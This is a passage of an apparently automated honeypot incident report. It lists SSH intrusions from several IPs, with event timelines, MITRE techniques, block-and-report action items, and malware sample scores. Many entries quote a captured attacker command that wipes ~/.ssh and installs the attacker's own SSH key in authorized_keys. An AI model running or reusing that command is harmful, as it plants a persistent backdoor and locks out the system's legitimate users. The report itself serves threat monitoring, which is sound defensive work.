| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:57:57` | `cowrie.session.connect` |
| `2026-04-13 14:57:57` | `cowrie.client.version` |
| `2026-04-13 14:57:57` | `cowrie.client.kex` |
| `2026-04-13 14:57:57` | `cowrie.login.success` |
| `2026-04-13 14:57:58` | `cowrie.session.params` |
| `2026-04-13 14:57:58` | `cowrie.command.input` |
| `2026-04-13 14:57:58` | `cowrie.command.failed` |
| `2026-04-13 14:57:58` | `cowrie.log.closed` |
| `2026-04-13 14:57:58` | `cowrie.session.params` |
| `2026-04-13 14:57:58` | `cowrie.command.input` |
| `2026-04-13 14:57:58` | `cowrie.session.file_download` |
| `2026-04-13 14:57:58` | `cowrie.log.closed` |
| `2026-04-13 14:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddec3568a115

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:58 |
| **Last Seen** | 2026-04-13 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:58:00` | `cowrie.session.connect` |
| `2026-04-13 14:58:00` | `cowrie.client.version` |
| `2026-04-13 14:58:01` | `cowrie.client.kex` |
| `2026-04-13 14:58:01` | `cowrie.login.success` |
| `2026-04-13 14:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-413395b8a2b2

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:58 |
| **Last Seen** | 2026-04-13 14:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:58:53` | `cowrie.session.connect` |
| `2026-04-13 14:58:53` | `cowrie.client.version` |
| `2026-04-13 14:58:53` | `cowrie.client.kex` |
| `2026-04-13 14:58:54` | `cowrie.login.success` |
| `2026-04-13 14:58:54` | `cowrie.session.params` |
| `2026-04-13 14:58:54` | `cowrie.command.input` |
| `2026-04-13 14:58:54` | `cowrie.command.failed` |
| `2026-04-13 14:58:54` | `cowrie.log.closed` |
| `2026-04-13 14:58:55` | `cowrie.session.params` |
| `2026-04-13 14:58:55` | `cowrie.command.input` |
| `2026-04-13 14:58:55` | `cowrie.session.file_download` |
| `2026-04-13 14:58:55` | `cowrie.log.closed` |
| `2026-04-13 14:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91332e803264

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 14:58 |
| **Last Seen** | 2026-04-13 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:58:57` | `cowrie.session.connect` |
| `2026-04-13 14:58:57` | `cowrie.client.version` |
| `2026-04-13 14:58:57` | `cowrie.client.kex` |
| `2026-04-13 14:58:58` | `cowrie.login.success` |
| `2026-04-13 14:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0bf5ce29f63

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:59 |
| **Last Seen** | 2026-04-13 14:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:59:32` | `cowrie.session.connect` |
| `2026-04-13 14:59:32` | `cowrie.client.version` |
| `2026-04-13 14:59:32` | `cowrie.client.kex` |
| `2026-04-13 14:59:32` | `cowrie.login.success` |
| `2026-04-13 14:59:33` | `cowrie.session.params` |
| `2026-04-13 14:59:33` | `cowrie.command.input` |
| `2026-04-13 14:59:33` | `cowrie.command.failed` |
| `2026-04-13 14:59:33` | `cowrie.log.closed` |
| `2026-04-13 14:59:33` | `cowrie.session.params` |
| `2026-04-13 14:59:33` | `cowrie.command.input` |
| `2026-04-13 14:59:33` | `cowrie.session.file_download` |
| `2026-04-13 14:59:33` | `cowrie.log.closed` |
| `2026-04-13 14:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb72cae9bb3c

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 14:59 |
| **Last Seen** | 2026-04-13 14:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 14:59:35` | `cowrie.session.connect` |
| `2026-04-13 14:59:35` | `cowrie.client.version` |
| `2026-04-13 14:59:35` | `cowrie.client.kex` |
| `2026-04-13 14:59:36` | `cowrie.login.success` |
| `2026-04-13 14:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fcda865839

| Field | Detail |
|---|---|
| **Source IP** | `129.121.79[.]67` |
| **First Seen** | 2026-04-13 15:01 |
| **Last Seen** | 2026-04-13 15:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:01:56` | `cowrie.session.connect` |
| `2026-04-13 15:01:56` | `cowrie.client.version` |
| `2026-04-13 15:01:56` | `cowrie.client.kex` |
| `2026-04-13 15:01:57` | `cowrie.login.success` |
| `2026-04-13 15:01:57` | `cowrie.session.params` |
| `2026-04-13 15:01:57` | `cowrie.command.input` |
| `2026-04-13 15:01:57` | `cowrie.command.failed` |
| `2026-04-13 15:01:57` | `cowrie.log.closed` |
| `2026-04-13 15:01:58` | `cowrie.session.params` |
| `2026-04-13 15:01:58` | `cowrie.command.input` |
| `2026-04-13 15:01:58` | `cowrie.session.file_download` |
| `2026-04-13 15:01:58` | `cowrie.log.closed` |
| `2026-04-13 15:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.79[.]67` to AbuseIPDB if not already reported
- [ ] Block `129.121.79[.]67` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0edaad3523

| Field | Detail |
|---|---|
| **Source IP** | `129.121.79[.]67` |
| **First Seen** | 2026-04-13 15:02 |
| **Last Seen** | 2026-04-13 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:02:01` | `cowrie.session.connect` |
| `2026-04-13 15:02:01` | `cowrie.client.version` |
| `2026-04-13 15:02:01` | `cowrie.client.kex` |
| `2026-04-13 15:02:02` | `cowrie.login.success` |
| `2026-04-13 15:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.79[.]67` to AbuseIPDB if not already reported
- [ ] Block `129.121.79[.]67` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38bd93361ee

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-13 15:03 |
| **Last Seen** | 2026-04-13 15:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:03:26` | `cowrie.session.connect` |
| `2026-04-13 15:03:26` | `cowrie.client.version` |
| `2026-04-13 15:03:26` | `cowrie.client.kex` |
| `2026-04-13 15:03:27` | `cowrie.login.success` |
| `2026-04-13 15:03:28` | `cowrie.session.params` |
| `2026-04-13 15:03:28` | `cowrie.command.input` |
| `2026-04-13 15:03:28` | `cowrie.command.failed` |
| `2026-04-13 15:03:28` | `cowrie.log.closed` |
| `2026-04-13 15:03:29` | `cowrie.session.params` |
| `2026-04-13 15:03:29` | `cowrie.command.input` |
| `2026-04-13 15:03:29` | `cowrie.session.file_download` |
| `2026-04-13 15:03:29` | `cowrie.log.closed` |
| `2026-04-13 15:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b71112cb53

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]84` |
| **First Seen** | 2026-04-13 15:03 |
| **Last Seen** | 2026-04-13 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:03:32` | `cowrie.session.connect` |
| `2026-04-13 15:03:32` | `cowrie.client.version` |
| `2026-04-13 15:03:32` | `cowrie.client.kex` |
| `2026-04-13 15:03:33` | `cowrie.login.success` |
| `2026-04-13 15:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]84` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48626e3951ff

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 15:07 |
| **Last Seen** | 2026-04-13 15:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:07:33` | `cowrie.session.connect` |
| `2026-04-13 15:07:33` | `cowrie.client.version` |
| `2026-04-13 15:07:33` | `cowrie.client.kex` |
| `2026-04-13 15:07:34` | `cowrie.login.success` |
| `2026-04-13 15:07:34` | `cowrie.session.params` |
| `2026-04-13 15:07:34` | `cowrie.command.input` |
| `2026-04-13 15:07:34` | `cowrie.command.failed` |
| `2026-04-13 15:07:34` | `cowrie.log.closed` |
| `2026-04-13 15:07:35` | `cowrie.session.params` |
| `2026-04-13 15:07:35` | `cowrie.command.input` |
| `2026-04-13 15:07:35` | `cowrie.session.file_download` |
| `2026-04-13 15:07:35` | `cowrie.log.closed` |
| `2026-04-13 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b884a002b8a

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 15:07 |
| **Last Seen** | 2026-04-13 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:07:37` | `cowrie.session.connect` |
| `2026-04-13 15:07:37` | `cowrie.client.version` |
| `2026-04-13 15:07:37` | `cowrie.client.kex` |
| `2026-04-13 15:07:38` | `cowrie.login.success` |
| `2026-04-13 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4eefaf02917

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 15:10 |
| **Last Seen** | 2026-04-13 15:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:10:40` | `cowrie.session.connect` |
| `2026-04-13 15:10:40` | `cowrie.client.version` |
| `2026-04-13 15:10:40` | `cowrie.client.kex` |
| `2026-04-13 15:10:40` | `cowrie.login.success` |
| `2026-04-13 15:10:41` | `cowrie.session.params` |
| `2026-04-13 15:10:41` | `cowrie.command.input` |
| `2026-04-13 15:10:41` | `cowrie.command.failed` |
| `2026-04-13 15:10:41` | `cowrie.log.closed` |
| `2026-04-13 15:10:41` | `cowrie.session.params` |
| `2026-04-13 15:10:41` | `cowrie.command.input` |
| `2026-04-13 15:10:41` | `cowrie.session.file_download` |
| `2026-04-13 15:10:41` | `cowrie.log.closed` |
| `2026-04-13 15:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a78795a1175d

| Field | Detail |
|---|---|
| **Source IP** | `212.23.133[.]68` |
| **First Seen** | 2026-04-13 15:10 |
| **Last Seen** | 2026-04-13 15:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:10:43` | `cowrie.session.connect` |
| `2026-04-13 15:10:43` | `cowrie.client.version` |
| `2026-04-13 15:10:43` | `cowrie.client.kex` |
| `2026-04-13 15:10:44` | `cowrie.login.success` |
| `2026-04-13 15:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.23.133[.]68` to AbuseIPDB if not already reported
- [ ] Block `212.23.133[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc6bd2a259ff

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:11 |
| **Last Seen** | 2026-04-13 15:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:11:14` | `cowrie.session.connect` |
| `2026-04-13 15:11:14` | `cowrie.client.version` |
| `2026-04-13 15:11:14` | `cowrie.client.kex` |
| `2026-04-13 15:11:15` | `cowrie.login.success` |
| `2026-04-13 15:11:15` | `cowrie.session.params` |
| `2026-04-13 15:11:15` | `cowrie.command.input` |
| `2026-04-13 15:11:15` | `cowrie.command.failed` |
| `2026-04-13 15:11:15` | `cowrie.log.closed` |
| `2026-04-13 15:11:16` | `cowrie.session.params` |
| `2026-04-13 15:11:16` | `cowrie.command.input` |
| `2026-04-13 15:11:16` | `cowrie.session.file_download` |
| `2026-04-13 15:11:16` | `cowrie.log.closed` |
| `2026-04-13 15:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ff76291818d

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:11 |
| **Last Seen** | 2026-04-13 15:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:11:18` | `cowrie.session.connect` |
| `2026-04-13 15:11:18` | `cowrie.client.version` |
| `2026-04-13 15:11:18` | `cowrie.client.kex` |
| `2026-04-13 15:11:19` | `cowrie.login.success` |
| `2026-04-13 15:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `212.23.133[.]68` | **24** | 2026-04-13 14:37 | 2026-04-13 15:13 | 0m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `13.81.183[.]29` | **21** | 2026-04-13 14:38 | 2026-04-13 15:12 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `51.68.65[.]117` | **7** | 2026-04-13 15:04 | 2026-04-13 15:13 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.104[.]37` | **2** | 2026-04-13 14:42 | 2026-04-13 14:44 | 3m | 0 | `T1592` | 🟢 LOW |
| `106.12.29[.]184` | 1 | 2026-04-13 15:05 | 2026-04-13 15:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.50.51[.]198` | 1 | 2026-04-13 15:05 | 2026-04-13 15:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.227.152[.]250` | 1 | 2026-04-13 15:04 | 2026-04-13 15:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.117.219[.]87` | 1 | 2026-04-13 13:44 | 2026-04-13 13:45 | 17s | 0 | `T1592` | 🟢 LOW |
| `129.121.79[.]67` | 1 | 2026-04-13 15:01 | 2026-04-13 15:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `217.154.233[.]215` | 1 | 2026-04-13 14:39 | 2026-04-13 14:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.79.6[.]34` | 1 | 2026-04-13 14:17 | 2026-04-13 14:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `41.242.115[.]84` | 1 | 2026-04-13 15:03 | 2026-04-13 15:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
